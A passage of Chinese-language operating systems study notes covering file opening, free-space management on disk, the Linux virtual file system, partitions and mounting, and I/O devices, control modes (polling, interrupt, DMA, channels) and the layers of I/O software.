<p>为了创建新的文件，应用程序调用逻辑文件系统。逻辑文件系统知道目录结构的格式，它将为文件分配一个新的 <code>FCB</code>。然后，系统将相应的目录读入内存，使用新的文件名和 <code>FCB</code> 进行更新，并将它写回磁盘。</p>
<p>一旦文件被创建，它就能用于 <code>I/O</code>。不过，首先要打开文件。系统调用 <code>open()</code> 将文件名传递给逻辑文件系统。调用 <code>open()</code> 首先搜索整个系统的打开文件表，以确定这个文件是否已被其他进程使用。如果已被使用，则在单个进程的打开文件表中创建一个条目，让其指向现有整个系统的打开文件表的相应条目。该算法在文件已打开时，能节省大量开销。如果这个文件尚未打开，则根据给定文件名来搜索目录结构。部分目录结构通常缓存在内存中，以加快目录操作。找到文件后，它的 <code>FCB</code> 会复制到整个系统的打开文件表中。该表不但存储 <code>FCB</code>，而且跟踪打开该文件的进程的数量。然后，在单个进程的打开文件表中创建一个条目，并且通过指针将整个系统打开文件表的条目与其他域（如：文件当前位置的指针和文件访问模式等）相连。调用 <code>open()</code> 返回的是一个指向单个进程的打开文件表中的适当条目的指针。以后，所有文件操作都通过该指针执行。一旦文件被打开，内核就不再使用文件名来访问文件，而使用文件描述符（Windows 称之为文件句柄）。</p>
<p>当进程关闭一个文件时，就会删除单个进程打开文件表中的相应条目，整个系统的打开文件表的文件打开数量也会递减。当所有打开某个文件的用户都关闭该文件后，任何更新的元数据将复制到磁盘的目录结构中，并且整个系统的打开文件表的对应条目也会被删除。</p>
</li>
</ol>
<h4> 外存空闲空间管理</h4>
<p>一个存储设备可以按整体用于文件系统，也可以细分。例如：一个磁盘可以划分为 4 个分区，每个分区都可以有单独的文件系统。包含文件系统的分区通常称为卷（volume）。卷可以是磁盘的一部分，也可以是整个磁盘，还可以是多个磁盘组成 <code>RAID</code> 集。</p>
<p>在一个卷中，存放文件数据的空间（文件区）和 <code>FCB</code> 的空间（目录区）是分离的。由于存在很多种类的文件表示和存放格式，所以现代操作系统中一般都有很多不同的文件管理模块，通过它们可以访问不同格式的卷中的文件。卷在提供文件服务前，必须由对应的文件程序进行初始化，划分好目录区和文件区，建立空闲空间管理表格及存放卷信息的超级块。</p>
<p>文件存储设备分成许多大小相同的物理块，并以块为单位交换信息，因此，文件存储设备的管理实质上是对空闲块的组织和管理，它包括空闲块的组织、分配与回收等问题。</p>
<ol>
<li>
<p><strong>空闲表法</strong></p>
<p>空闲表法属于连续分配方式，它与内存的动态分配方式类似，为每个文件分配一块连续的存储空间。系统为外存上的所有空闲区建立一张空闲表，每个空闲区对应一个空闲表项，其中包括表项序号、该空闲区的第一个盘块号、该区的空闲盘块数等信息。再将所有空闲区按其起始盘块号递增的次序排列。</p>
<p>空闲盘区的分配与内存的动态分配类似，同样采用首次适应算法和最佳适应算法等。例如：在系统为某新创建的文件分配空闲盘块时，先顺序地检索空闲盘块表的各表项，直至找到第一个其大小能满足要求的空闲区，再将该盘区分配给用户，同时修改空闲盘块表。</p>
<p>系统在对用户所释放的存储空间进行回收时，也采取类似于内存回收的方法，即要考虑回收区是否与空闲盘块表中插入点的前区和后区相邻接，对相邻接者应予以合并。</p>
</li>
<li>
<p><strong>空闲链表法</strong></p>
<p>将所有空闲盘区拉成一条空闲链。根据构成链所用基本元素的不同，分为两种形式：</p>
<ul>
<li><strong>空闲盘块链</strong>：将磁盘上的所有空闲空间以盘块为单位拉成一条链。当用户因创建文件而请求分配存储空间时，系统从链首开始，依次摘下适当数目的空闲盘块分配给用户。当用户因删除文件而释放存储空间时，系统将回收的盘块依次插入空闲盘块链的末尾。这种方法的优点是分配和回收一个盘块的过程非常简单，但在为一个文件分配盘块时可能要重复操作多次，效率较低。又因它是以盘块为单位的，空闲盘块链会很长</li>
<li><strong>空闲盘区链</strong>：将磁盘上的所有空闲盘区（每个盘区可包含若干个盘块）拉成一条链。每个盘区除含有用于指示下一个空闲盘区的指针外，还应有能指明本盘区大小（盘块数）的信息。分配盘区的方法与内存的动态分区分配类似，通常采用首次适应算法。在回收盘区时，同样也要将回收区与相邻接的空闲盘区合并。这种方法的优缺点刚好与第一种方法的相反，即分配与回收的过程比较复杂，但效率通常较高，且空闲盘区链较短</li>
</ul>
</li>
<li>
<p><strong>位示图法</strong></p>
<p>位示图是利用二进制的一位来表示磁盘中一个盘块的使用情况，磁盘上所有的盘块都有一个二进制位与之对应。当其值为 <code>0</code> 时，表示对应的盘块空闲；为 <code>1</code> 时，表示已分配。这样，一个 <code>m x n</code> 位组成的位示图就可用来表示 <code>m x n</code> 个盘块的使用情况。</p>
<p><strong>盘块的分配：</strong></p>
<ul>
<li>顺序扫描位示图，从中找出一个或一组其值为 <code>0</code> 的二进制位</li>
<li>将找到的一个或一组二进制位，转换成与之对应的盘块号。若找到的其值为 <code>0</code> 的二进制位位于位示图的第 <code>i</code> 行、第 <code>j</code> 列，则其相应的盘块号应按下式计算（n 为每行位数）：<code>b = n(i - 1) + j</code></li>
<li>修改位示图，令 <code>map[i, j] = 1</code></li>
</ul>
<p><strong>盘块的回收</strong>:</p>
<ul>
<li>将回收盘块的盘块号转换成位示图中的行号和列号。转换公式为：<code>i = (b - 1) DIV n + 1</code>、<code>j = (b - 1) MOD n + 1</code></li>
<li>修改位示图，令 <code>map[i, j] = 0</code></li>
</ul>
</li>
</ol>
<p>空闲表法和空闲链表法都不适用于大型文件系统，因为这会使空闲表或空闲链表太大。</p>
<ol start="4">
<li>
<p><strong>成组链接法</strong></p>
<p>在 UNIX 系统中采用的是成组链接法，这种方法结合了空闲表和空闲链表两种方法，它具有上述两种方法的优点，克服了两种方法均有的表太长的缺点。</p>
<p>用来存放一组空闲盘块号（空闲盘块的块号）的盘块称为成组链块。成组链接法的大致思想是：把顺序的 <code>n</code> 个空闲盘块号保存在第一个成组链块中，其最后一个空闲盘块（作为成组链块）则用于保存另一组空闲盘块号，如此继续，直至所有空闲盘块均予以链接。系统只需保存指向第一个成组链块的指针。</p>
<p><strong>盘块的分配</strong>：根据第一个成组链块的指针，将其对应的盘块分配给用户，然后将指针下移一格。若该指针指向的是最后一个盘块（即成组链块），由于该盘块记录的是下一组空闲盘块号，因此要将该盘块读入内存，并将指针指向新的成组链块的第一条记录，然后执行上述分配操作。</p>
<p><strong>盘块的回收</strong>：成组链块的指针上移一格，再记入回收盘块号。当成组链块的链接数达到 <code>n</code> 时表示已满，便将现有已记录 <code>n</code> 个空闲盘块号的成组链块号记入新回收的盘块（作为新的成组链块）。</p>
</li>
</ol>
<p>表示空闲空间的位向量表或第一个成组链块，以及卷中的目录区、文件区划分信息都要存放在磁盘中，一般放在卷头位置，在 UNIX 系统中称为超级块。在对卷中的文件进行操作前，超级块需要预先读入系统空闲的主存，并且经常保持主存超级块与磁盘卷中超级块的一致性。</p>
<h4> 虚拟文件系统</h4>
<p><strong>虚拟文件系统（VFS）为用户程序提供了文件系统操作的统一接口</strong>，屏蔽了不同文件系统的差异和操作细节，如下图所示。用户程序可以通过 <code>VFS</code> 提供的统一调用函数（如：<code>open()</code> 等）来操作不同文件系统（如：<code>ext3</code> 等）的文件，而无须考虑具体的文件系统和实际的存储介质。</p>
<figure><figcaption>虚拟文件系统</figcaption></figure>
<p>虚拟文件系统采用了面向对象的思想，它抽象出一个通用的文件系统模型，定义了通用文件系统都支持的接口。新的文件系统只要支持并实现这些接口，即可安装和使用。以 Linux 中调用 <code>write()</code> 操作为例，它在 <code>VFS</code> 中通过 <code>sys_write()</code> 函数处理，<code>sys_write()</code> 找到具体文件系统，将控制权交给该文件系统，最后由具体文件系统与物理介质交互并写入数据。</p>
<p>为了实现 <code>VFS</code>，Linux 主要抽象了四种对象类型。每个 <code>VFS</code> 对象都存放在一个适当的数据结构中，其中包括对象的属性和指向对象方法（函数）表的指针。</p>
<ul>
<li><strong>超级块对象</strong>：表示一个已安装（或称挂载）的特定文件系统</li>
<li><strong>索引结点对象</strong>：表示一个特定的文件</li>
<li><strong>目录项对象</strong>：表示一个特定的目录项</li>
<li><strong>文件对象</strong>：表示一个与进程相关的已打开文件</li>
</ul>
<p>Linux 将目录当作文件对象来处理，文件操作能同时应用于文件或目录。文件系统是由层次目录组成的，一个目录项可能包含文件名和其他目录名。目录项作为单独抽象的对象，是因为目录可以层层嵌套，以便于形成文件路径，而路径中的每一部分其实就是目录项。</p>
<ul>
<li><strong>超级块对象</strong>：超级块对象对应于磁盘上特定扇区的文件系统超级块，用于存储已安装文件系统的元信息，元信息中包含文件系统的基本属性信息，如：文件系统类型、文件系统基本块的大小、文件系统所挂载的设备、操作方法（函数）指针等。其中操作方法（函数）指针指向该超级块的操作方法表，包含二系列可在超级块对象上调用的操作函数，主要有分配 inode、销毁 inode、读 inode、写 mode、文件同步等</li>
<li><strong>索引结点对象</strong>：文件系统处理文件所需要的所有信息，都放在一个称为索引结点的数据结构中，索引结点对文件是唯一的。只有当文件被访问时，才在内存中创建索引结点对象，每个索引结点对象都会复制磁盘索引结点包含的一些数据。该对象中有一个状态字段表示是否被修改，其值为 “脏” 时，说明对应的磁盘索引结点必须被更新。索引结点对象还提供许多操作接口，如：创建新索引结点、创建硬链接、创建新目录等</li>
<li><strong>目录项对象</strong>：由于 <code>VFS</code> 经常执行切换到某个目录这种操作，为了提高效率，便引入了目录项的概念。目录项对象是一个路径的组成部分，它要么是目录名，要么是文件名。例如：在查找路径名 <code>/test</code> 时，内核为根目录 <code>/</code> 创建一个目录项对象，为根目录下的 <code>test</code> 创建一个第二级目录项对象。目录项对象包含指向关联索引结点的指针，还包含指向父目录和指向子目录的指针。不同于前面两个对象，目录项对象在磁盘上没有对应的数据结构，而是 <code>VFS</code> 在遍历路径的过程中，将它们逐个解析成目录项对象的</li>
<li><strong>文件对象</strong>：文件对象代表进程打开的一个文件。可以通过 <code>open()</code> 调用打开一个文件，通过 <code>close()</code> 调用关闭一个文件。文件对象和物理文件的关系类似于进程和程序的关系。由于多个进程可以打开和操作同一文件，所以同一文件在内存中可能存在多个对应的文件对象，但对应的索引结点和目录项是唯一的。文件对象仅在进程观点上代表已经打开的文件，它反过来指向其索引结点。文件对象包含与该文件相关联的目录项对象，包含该文件的文件系统、文件指针等，还包含在该文件对象上调用的一系列操作函数</li>
</ul>
<p>三个不同的进程已打开了同一个文件，其中两个进程使用同一个硬链接。在这种情况下，每个进程都使用自己的文件对象，但只需要两个目录项对象，每个硬链接对应一个目录项对象。这两个目录项对象指向同一个索引结点对象，这个索引结点对象标识的是超级块对象及随后的普通磁盘文件。</p>
<p><code>VFS</code> 还有另一个重要作用，即提高系统性能。最近最常使用的目录项对象被放在目录项高速缓存的磁盘缓存中，以加速从文件路径名到最后一个路径分量的索引结点的转换过程。</p>
<p>对用户来说，不需要关心不同文件系统的具体实现细节，只需要对一个虚拟的文件操作界面进行操作。<code>VFS</code> 对每个文件系统的所有细节进行抽象，使得不同的文件系统在系统中运行的其他进程看来都是相同的。严格来说，<code>VFS</code> 并不是一种实际的文件系统，它只存在于内存中，不存在于任何外存空间中。<code>VFS</code> 在系统启动时建立，在系统关闭时消亡。</p>
<h4> 分区和安装</h4>
<p>一个磁盘可以划分为多个分区，每个分区都可以用于创建单独的文件系统，每个分区还可以包含不同的操作系统。分区可以是原始的，没有文件系统，当没有合适的文件系统时，可以使用原始磁盘。例如：UNIX 交换空间可以使用始磁盘格式，而不使用文件系统。</p>
<p>操作系统的引导。Linux 启动后，首先载入 <code>MBR</code>，随后 <code>MBR</code> 识别活动分区，并且加载活动分区中的引导程序。</p>
<p>分区的第一部分是引导块，里面存储着引导信息，它有自身的格式，因为在引导时系统并未加载文件系统代码，因此不能解释文件系统的格式。引导信息是一系列可以加载到内存中的连续块，加载到内存后从其第一条代码开始执行，引导程序便启动一个具体的操作系统。引导块之后是超级块，它存储文件系统的有关信息，包括文件系统的类型、<code>i</code> 结点的数目、数据块的数目。随后是多个索引结点，它们是实现文件存储的关键，每个文件对应一个索引结点，索引结点中包含多个指针，指向属于该文件的各个数据块。最后是文件数据块。</p>
<p>如文件在使用前必须打开一样，文件系统在进程使用前必须先安装，也称挂载。</p>
<p>Windows 系统维护一个扩展的两级目录结构，用驱动器字母表示设备和卷。卷具有常规树结构的目录，与驱动器号相关联，还含有指向已安装文件系统的指针。特定文件的路径形式为 <code>driver-letter:\path\to\file</code>，操作系统找到相应文件系统的指针，并且遍历该设备的目录结构，以查找指定的文件。新版本的 Windows 允许文件系统安装在目录树下的任意位置，就像 UNIX 一样。在启动时，Windows 操作系统自动发现所有设备，并且安装所有找到的文件系统。</p>
<p>UNIX 使用系统的根文件系统，由内核在引导阶段直接安装，其他文件系统要么由初始化脚本安装，要么由用户安装在已安装文件系统的目录下。作为一个目录树，每个文件系统都拥有自已的根目录。安装文件系统的这个目录称为安装点，安装就是将磁盘分区挂载到该安装点下，进入该目录就可以读取该分区的数据。已安装文件系统属于安装点目录的一个子文件系统。安装的实现是在目录 inode 的内存副本上加上一个标志，表示该目录是安装点。还有一个域指向安装表的条目，表示哪个设备安装在哪里，这个条目还包括该设备的文件系统超级块的一个指针。</p>
<p>假定将存放在 <code>/dev/fd0</code> 软盘上的 <code>ext2</code> 文件系统通过 <code>mount</code> 命令安装到 <code>/flp</code>：<code>mount -t ext2 /dev/fd0 /flp</code>。如需卸载该文件系统，可以使用 <code>umount</code> 命令。</p>
<p>可以这么理解：UNIX 本身是一个固定的目录树，只要安装就有，但是如果不给它分配存储空间，就不能对它进行操作，所以首先要给根目录分配空间，这样才能操作这个目录树。</p>
<h2> 输入/输出（I/O）管理</h2>
<h3> I/O 管理概述</h3>
<h4> I/O 设备</h4>
<p><code>I/O</code> 设备管理是操作系统设计中最凌乱也最具挑战性的部分。由于它包含了很多领域的不同设备及与设备相关的应用程序，因此很难有一个通用且一致的设计方案。</p>
<ol>
<li>
<p><strong>设备的分类</strong></p>
<p><strong>按信息交换的单位分类，I/O 设备可分为：</strong></p>
<ul>
<li><strong>块设备</strong>：信息交换以数据块为单位。它属于有结构设备，如：磁盘等。磁盘设备的基本特征是传输速率较高、可寻址，即对它可随机地读/写任意一块</li>
<li><strong>字符设备</strong>：信息交换以字符为单位。它属于无结构类型，如：交互式终端机、打印机等。它们的基本特征是传输速率低、不可寻址，并且时常采用中断 <code>I/O</code> 方式</li>
</ul>
<p><strong>按传输速率分类，I/O 设备可分为：</strong></p>
<ul>
<li><strong>低速设备</strong>：传输速率仅为每秒几字节到数百字节的一类设备，如：键盘、鼠标等</li>
<li><strong>中速设备</strong>：传输速率为每秒数千字节至数万字节的一类设备，如：激光打印机等</li>
<li><strong>高速设备</strong>：传输速率在数百千字节至千兆字节的一类设备，如：磁盘机、光盘机等</li>
</ul>
</li>
<li>
<p><strong>I/O 接口</strong></p>
<p><code>I/O</code> 接口（设备控制器）位于 CPU 与设备之间，它既要与 CPU 通信，又要与设备通信，还要具有按 CPU 发来的命令去控制设备工作的功能，主要由三部分组成：</p>
<ul>
<li><strong>设备控制器与 CPU 的接口</strong>：该接口有三类信号线：数据线、地址线和控制线。数据线通常与两类寄存器相连：数据寄存器（存放从设备送来的输入数据或从 CPU 送来的输出数据）和控制/状态寄存器（存放从 CPU 送来的控制信息或设备的状态信息）</li>
<li><strong>设备控制器与设备的接口</strong>：一个设备控制器可以连接一个或多个设备，因此控制器中有一个或多个设备接口。每个接口中都存在数据、控制和状态三种类型的信号</li>
<li><strong>I/O 逻辑</strong>：用于实现对设备的控制。它通过一组控制线与 CPU 交互，对从 CPU 收到的 <code>I/O</code> 命令进行译码。CPU 启动设备时，将启动命令发送给控制器，同时通过地址线把地址发送给控制器，由控制器的 <code>I/O</code> 逻辑对地址进行译码，并相应地对所选设备进行控制</li>
</ul>
<p><strong>设备控制器的主要功能有：</strong></p>
<ul>
<li>接收和识别 CPU 发来的命令，如：磁盘控制器能接收读、写、查找等命令</li>
<li>数据交换，包括设备和控制器之间的数据传输，以及控制器和主存之间的数据传输</li>
<li>标识和报告设备的状态，以供 CPU 处理</li>
<li>地址识别</li>
<li>数据缓冲</li>
<li>差错控制</li>
</ul>
</li>
<li>
<p><strong>I/O 端口</strong></p>
<p><code>I/O</code> 端口是指设备控制器中可被 CPU 直接访问的寄存器，主要有以下三类寄存器：</p>
<ul>
<li><strong>数据寄存器</strong>：实现 CPU 和外设之间的数据缓冲</li>
<li><strong>状态寄存器</strong>：获取执行结果和设备的状态信息，以让 CPU 知道是否准备好</li>
<li><strong>控制寄存器</strong>：由 CPU 写入，以便启动命令或更改设备模式</li>
</ul>
<p>为了实现 CPU 与 <code>I/O</code> 端口进行通信，有两种方法：</p>
<ul>
<li><strong>独立编址</strong>：为每个端口分配一个 <code>I/O</code> 端口号，所有 <code>I/O</code> 端口形成 <code>I/O</code> 端口空间，普通用户程序不能对其进行访问，只有操作系统使用特殊的 <code>I/O</code> 指令才能访问端口</li>
<li><strong>统一编址</strong>：又称内存映射 <code>I/O</code>，每个端口被分配唯一的内存地址，且不会有内存被分配这一地址，通常分配给端口的地址靠近地址空间的顶端</li>
</ul>
</li>
</ol>
<h4> I/O 控制方式</h4>
<p>设备管理的主要任务之一是控制设备和内存或 CPU 之间的数据传送。外围设备和内存之间的输入/输出控制方式有四种。</p>
<ol>
<li>
<p><strong>程序直接控制方式</strong></p>
<p>计算机从外部设备读取的每个字，CPU 需要对外设状态进行循环检查，直到确定该字已经在 <code>I/O</code> 控制器的数据寄存器中。在程序直接控制方式中，由于 CPU 的高速性和 <code>I/O</code> 设备的低速性，致使 CPU 的绝大部分时间都处于等待 <code>I/O</code> 设备完成数据 <code>I/O</code> 的循环测试中，造成了 CPU 资源的极大浪费。在该方式中，CPU 之所以要不断地测试 <code>I/O</code> 设备的状态，就是因为在 CPU 中未采用中断机构，使 <code>I/O</code> 设备无法向 CPU 报告它已完成了一个字符的输入操作。</p>
<p>程序直接控制方式虽然简单且易于实现，但其缺点也显而易见，由于 CPU 和 <code>I/O</code> 设备只能串行工作，导致 CPU 的利用率相当低。</p>
</li>
<li>
<p><strong>中断驱动方式</strong></p>
<p>中断驱动方式的思想是，允许 <code>I/O</code> 设备主动打断 CPU 的运行并请求服务，从而 “解放” CPU，使得其向 <code>I/O</code> 控制器发送读命令后可以继续做其他有用的工作。从 <code>I/O</code> 控制器和 CPU 两个角度分别来看中断驱动方式的工作过程。</p>
<p>从 <code>I/O</code> 控制器的角度来看，<code>I/O</code> 控制器从 CPU 接收一个读命令，然后从外部设备读数据。一旦数据读入 <code>I/O</code> 控制器的数据寄存器，便通过控制线给 CPU 发出中断信号，表示数据已准备好，然后等待 CPU 请求该数据。<code>I/O</code> 控制器收到 CPU 发出的取数据请求后，将数据放到数据总线上，传到 CPU 的寄存器中。至此，本次 <code>I/O</code> 操作完成，<code>I/O</code> 控制器又可开始下一次 <code>I/O</code> 操作。</p>
<p>从 CPU 的角度来看，CPU 发出读命令，然后保存当前运行程序的上下文（包括程序计数器及处理机寄存器），转去执行其他程序。在每个指令周期的末尾，CPU 检查中断。当有来自 <code>I/O</code> 控制器的中断时，CPU 保存当前正在运行程序的上下文，转去执行中断处理程序以处理该中断。这时，CPU 从 <code>I/O</code> 控制器读一个字的数据传送到寄存器，并存入主存。接着，CPU 恢复发出 <code>I/O</code> 命令的程序（或其他程序）的上下文，然后继续运行。</p>
<p>中断驱动方式比程序直接控制方式有效，但由于数据中的每个字在存储器与 <code>I/O</code> 控制器之间的传输都必须经过 CPU，这就导致了中断驱动方式仍然会消耗较多的 CPU 时间。</p>
</li>
<li>
<p><strong>DMA 方式</strong></p>
<p>在中断驱动方式中，<code>I/O</code> 设备与内存之间的数据交换必须要经过 CPU 中的寄存器，所以速度还是受限，而 DMA（直接存储器存取）方式的基本思想是在 <code>I/O</code> 设备和内存之间开辟直接的数据交换通路，彻底 “解放” CPU。<strong>DMA 方式的特点如下：</strong></p>
<ul>
<li>基本单位是数据块</li>
<li>所传送的数据，是从设备直接送入内存的，或者相反</li>
<li>仅在传送一个或多个数据块的开始和结束时，才需 CPU 干预，整块数据的传送是在 DMA 控制器的控制下完成的</li>
</ul>
<p>要在主机与控制器之间实现成块数据的直接交换，须在 DMA 控制器中设置如下四类寄存器：</p>
<ul>
<li><strong>命令/状态寄存器（CR）</strong>：接收从 CPU 发来的 <code>I/O</code> 命令、有关控制信息，或设备的状态</li>
<li><strong>内存地址寄存器（MAR）</strong>：在输入时，它存放把数据从设备传送到内存的起始目标地址；在输出时，它存放由内存到设备的内存源地址</li>
<li><strong>数据寄存器（DR）</strong>：暂存从设备到内存或从内存到设备的数据</li>
<li><strong>数据计数器（DC）</strong>：存放本次要传送的字（节）数</li>
</ul>
<p>DMA 方式的工作过程是：CPU 接收到 <code>I/O</code> 设备的 DMA 请求时，它给 DMA 控制器发出一条命令，同时设置 MAR 和 DC 初值，启动 DMA 控制器，然后继续其他工作。之后 CPU 就把控制操作委托给 DMA 控制器，由该控制器负责处理。DMA 控制器直接与存储器交互，传送整个数据块，每次传送一个字，这个过程不需要 CPU 参与。传送完成后，DMA 控制器发送一个中断信号给处理器。因此只有在传送开始和结束时才需要 CPU 的参与。</p>
<p>DMA 方式与中断方式的主要区别是：中断方式在每个数据需要传输时中断 CPU，而 DMA 方式则是在所要求传送的一批数据全部传送结束时才中断 CPU；此外，中断方式的数据传送是在中断处理时由 CPU 控制完成的，而 DMA 方式则是在 DMA 控制器的控制下完成的。</p>
</li>
<li>
<p><strong>通道制方式</strong></p>
<p><code>I/O</code> 通道是指专门负责输入/输出的处理机。<code>I/O</code> 通道方式是 DMA 方式的发展，它可以进一步减少 CPU 的干预，即把对一个数据块的读（或写）为单位的干预，减少为对一组数据块的读（或写）及有关控制和管理为单位的干预。同时，又可以实现 CPU、通道和 <code>I/O</code> 设备三者的并行操作，从而更有效地提高整个系统的资源利用率。</p>
<p>例如：当 CPU 要完成一组相关的读（或写）操作及有关控制时，只需向 <code>I/O</code> 通道发送一条 <code>I/O</code> 指令，以给出其所要执行的通道程序的首地址和要访问的 <code>I/O</code> 设备，通道接到该指令后，执行通道程序便可完成 CPU 指定的 <code>I/O</code> 任务，数据传送结束时向 CPU 发中断请求。</p>
<p><code>I/O</code> 通道与一般处理机的区别是：通道指令的类型单一，没有自已的内存，通道所执行的通道程序是放在主机的内存中的，也就是说通道与 CPU 共享内存。</p>
<p><code>I/O</code> 通道与 DMA 方式的区别是：DMA 方式需要 CPU 来控制传输的数据块大小、传输的内存位置，而通道方式中这些信息是由通道控制的。另外，每个 DMA 控制器对应一台设备与内存传递数据，而一个通道可以控制多台设备与内存的数据交换。</p>
<p>用一个例子来总结这四种 <code>I/O</code> 方式。想象一位客户要去裁缝店做一批衣服的情形。</p>
<p><strong>采用程序控制方式时</strong>，裁缝没有客户的联系方式，客户必须每隔一段时间去裁缝店看看裁缝把衣服做好了没有，这就浪费了客户不少的时间。<strong>采用中断方式时</strong>，裁缝有客户的联系方式，每当他完成一件衣服后，给客户打一个电话，让客户去拿，与程序直接控制能省去客户不少麻烦，但每完成一件衣服就让客户去拿一次，仍然比较浪费客户的时间。<strong>采用 DMA 方式时</strong>，客户花钱雇一位单线秘书，并向秘书交代好把衣服放在哪里（存放仓库），裁缝要联系就直接联系秘书，秘书负责把衣服取回来并放在合适的位置，每处理完 <code>100</code> 件衣服，秘书就要给客户报告一次（大大节省了客户的时间）。<strong>采用通道方式时</strong>，秘书拥有更高的自主权，与 DMA 方式相比，他可以决定把衣服存放在哪里，而不需要客户操心。而且，何时向客户报告，是处理完 <code>100</code> 件衣服就报告，还是处理完 <code>10000</code> 件衣服才报告，秘书是可以决定的。客户有可能在多个裁缝那里订了货，一位 DMA 类的秘书只能负责与一位裁缝沟通，但通道类秘书却可以与多名裁缝进行沟通。</p>
</li>
</ol>
<h4> I/O 软件层次结构</h4>
<p><code>I/O</code> 软件涉及的面很宽，往下与硬件有着密切关系，往上又与虚拟存储器系统、文件系统和用户直接交互，它们都需要 <code>I/O</code> 软件来实现 <code>I/O</code> 操作。</p>
<p>为使复杂的 <code>I/O</code> 软件能具有清晰的结构、良好的可移植性和易适应性，目前已普遍采用层次式结构的 <code>I/O</code> 软件。将系统中的设备管理模块分为若干个层次，每层都是利用其下层提供的服务，完成输入/输出功能中的某
些子功能，并屏蔽这些功能实现的细节，向高层提供服务。在层次式结构的 <code>I/O</code> 软件中，只要层次间的接口不变，对某一层次中的软件的修改都不会引起其下层或高层代码的变更，仅最低层才涉及硬件的具体特性。</p>
<p>一个比较合理的层次划分如下所示。整个 <code>I/O</code> 软件可以视为具有四个层次的系统结构，各层次及其功能如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">I/O 层次结构</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">用户层 I/O 软件</td>
</tr>
<tr>
<td style="text-align:center">设备独立性软件</td>
</tr>
<tr>
<td style="text-align:center">设备驱动程序</td>
</tr>
<tr>
<td style="text-align:center">中断处理程序</td>
</tr>
<tr>
<td style="text-align:center">硬件</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p><strong>用户层 I/O 软件</strong></p>
<p>实现与用户交互的接口，用户可直接调用在用户层提供的、与 <code>I/O</code> 操作有关的库函数，对设备进行操作。一般而言，大部分的 <code>I/O</code> 软件都在操作系统内部，但仍有一小部分在用户层，包括与用户程序链接在一起的库函数。用户层软件必须通过一组系统调用来获取操作系统服务。</p>
</li>
<li>
<p><strong>设备独立性软件</strong></p>
<p>用于实现用户程序与设备驱动器的统一接口、设备命令、设备的保护及设备的分配与释放等，同时为设备管理和数据传送提供必要的存储空间。</p>
<p>设备独立性也称设备无关性，使得应用程序独立于具体使用的物理设备。为实现设备独立性而引入了逻辑设备和物理设备这两个概念。在应用程序中，使用逻辑设备名来请求使用某类设备；而在系统实际执行时，必须将逻辑设备名映射成物理设备名使用。</p>
<p>使用逻辑设备名的好处是：增加设备分配的灵活性；易于实现 <code>I/O</code> 重定向，所谓 <code>I/O</code> 重定向，是指用于 <code>I/O</code> 操作的设备可以更换（即重定向），而不必改变应用程序</p>
<p>为了实现设备独立性，必须再在驱动程序之上设置一层设备独立性软件。总体而言，设备独立性软件的主要功能可分为以下两个方面：一执行所有设备的公有操作，包括：对设备的分配与回收；将逻辑设备名映射为物理设备名；对设备进行保护，禁止用户直接访问设备；缓冲管理；差错控制；提供独立于设备的大小统一的逻辑块，屏蔽设备之间信息交换单位大小和传输速率的差异。二向用户层（或文件层）提供统一接口。无论何种设备，它们向用户所提供的接口应是相同的。例如：对各种设备的读/写操作，在应用程序中都统一使用 <code>read/write</code> 命令等。</p>
</li>
<li>
<p><strong>设备驱动程序</strong></p>
<p>与硬件直接相关，负责具体实现系统对设备发出的操作指令，驱动 <code>I/O</code> 设备工作的驱动程序。通常，每类设备配置一个设备驱动程序，它是 <code>I/O</code> 进程与设备控制器之间的通信程序，通常以进程的形式存在。设备驱动程序向上层用户程序提供一组标准接口，设备具体的差别被设备驱动程序所封装，用于接收上层软件发来的抽象 <code>I/O</code> 要求，如：<code>read</code> 和 <code>write</code> 命令，转换为具体要求后，发送给设备控制器，控制 <code>I/O</code> 设备工作；它也将由设备控制器发来的信号传送给上层软件，从而为 <code>I/O</code> 内核子系统隐藏设备控制器之间的差异。</p>
</li>
<li>
<p><strong>中断处理程序</strong></p>
<p>用于保存被中断进程的 CPU 环境，转入相应的中断处理程序进行处理，处理完毕再恢复被中断进程的现场后，返回到被中断进程。</p>
<p>中断处理层的主要任务有：进行进程上下文的切换，对处理中断信号源进行测试，读取设备状态和修改进程状态等。由于中断处理与硬件紧密相关，对用户而言，应尽量加以屏蔽，因此应放在操作系统的底层，系统的其余部分尽可能少地与之发生联系。</p>
</li>
</ul>
<p>以用户对设备的一次命令来总结各层次的功能。例如：</p>
<ol>
<li>当用户要读取某设备的内容时，通过操作系统提供的 <code>read</code> 命令接口，这就经过了用户层</li>
<li>操作系统提供给用户使用的接口，一般是统一的通用接口，也就是几乎每个设备都可以响应的统一命令，如：<code>read</code> 命令，用户发出的 <code>read</code> 命令，首先经过设备独立层进行解析，然后交往下层</li>
<li>接下来，不同类型的设备对 <code>read</code> 命令的行为会有所不同，如：磁盘接收 <code>read</code> 命令后的行为与打印机接收 <code>read</code> 命令后的行为是不同的。因此，需要针对不同的设备，把 <code>read</code> 命令解析成不同的指令，这就经过了设备驱动层</li>
<li>命令解析完毕后，需要中断正在运行的进程，转而执行 <code>read</code> 命令，这就需要中断处理程序</li>
<li>最后，命令真正抵达硬件设备，硬件设备的控制器按照上层传达的命令操控硬件设备，完成相应的功能</li>
</ol>
<h4> 应用程序 I/O 接口</h4>
<p>在 <code>I/O</code> 系统与高层之间的接口中，根据设备类型的不同，又进一步分为若于接口。</p>
<ul>
<li>
<p><strong>字符设备接口</strong></p>
<p>字符设备是指数据的存取和传输是以字符为单位的设备，如：键盘、打印机等。基本特征是传输速率较低、不可寻址，并且在输入/输出时通常采用中断驱动方式。</p>
<p><code>get</code> 和 <code>put</code> 操作。由于字符设备不可寻址，只能采取顺序存取方式，通常为字符设备建立一个字符缓冲区，用户程序通过 <code>get</code> 操作从缓冲区获取字符，通过 <code>put</code> 操作将字符输出到缓冲区。</p>
<p><code>in-control</code> 指令。字符设备类型繁多，差异甚大，因此在接口中提供一种通用的 <code>in-control</code> 指令来处理它们（包含了许多参数，每个参数表示一个与具体设备相关的特定功能）。</p>
<p>字符设备都属于独占设备，为此接口中还需要提供打开和关闭操作，以实现互斥共享。</p>
</li>
<li>
<p><strong>块设备接口</strong></p>
<p>块设备是指数据的存取和传输是以数据块为单位的设备，典型的块设备是磁盘。基本特征是传输速率较高、可寻址。磁盘设备的 <code>I/O</code> 常采用 DMA 方式。</p>
